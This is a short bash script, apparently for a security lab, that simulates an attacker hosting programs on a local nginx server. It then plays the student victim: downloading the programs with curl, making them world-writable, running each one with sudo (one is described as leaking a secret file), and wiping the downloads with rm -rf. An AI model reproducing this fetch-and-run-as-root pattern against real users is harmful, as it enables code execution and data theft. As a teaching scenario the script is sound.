#!/bin/bash

NGX=/home/attacker/local/nginx/sbin/nginx

# Attacker setup server
function ngx_start() {
	eval "sudo $NGX";
}

# Attack stop server
function ngx_stop() {
	eval "sudo $NGX -s stop";
}

# 1. The attack maintains a nginx web server on localhost:8080

ngx_start

# 2. The victim (student) downloads programs from the server

SERVER_ADDR="localhost:8080"
DOWNLOAD_LOC="/home/student/Downloads"

for i in $(seq 1 11)
do
	curl $SERVER_ADDR/programs/program$i -o $DOWNLOAD_LOC/program$i > /dev/null 2>&1
	chmod 777 $DOWNLOAD_LOC/program$i
done

# 3. The victim (student) runs the programs downloaded from the attacker's server,
#    and one of the programs is malicious.
#    The malicious program will leak /home/student/secret/secret.txt to the attacker.

for i in $(seq 1 11)
do
	sudo $DOWNLOAD_LOC/program$i 1>/dev/null
done

# 4. After running the programs, the victim (student) deletes all the downloaded files.
rm -rf /home/student/Downloads/*

ngx_stop
